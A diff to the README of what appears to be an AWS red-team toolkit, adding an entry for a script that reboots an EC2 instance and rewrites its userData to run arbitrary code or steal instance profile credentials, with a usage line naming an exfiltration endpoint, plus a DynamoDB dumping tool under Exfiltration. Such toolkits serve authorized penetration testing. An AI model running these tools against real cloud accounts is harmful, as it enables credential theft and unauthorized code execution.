@@ -69,6 +69,10 @@ Things to help you move around an account and gather different levels of access.
 ```
 ./add_iam_policy.py -u myuser -r myrole -g mygroup
 ```
+* bouncy_bouncy_cloudy_cloud - Bounces a given ec2 instance and rewrites its userData so that you can run arbirtary code or steal temporary instance profile credentials.
+```
+./bouncy_bouncy_cloudy_cloud.py -i instance-id -e exfiltration-endpoint
+```
 
 ## Persistence
 
@@ -86,6 +90,9 @@ Things to help maintain your access to an acccount.
 ## Exfiltration
 
 Things to help you extract and move data around in AWSy ways.
+
+* dynamodump - https://github.com/bchew/dynamodump
+
 
 ## Miscellanea
 
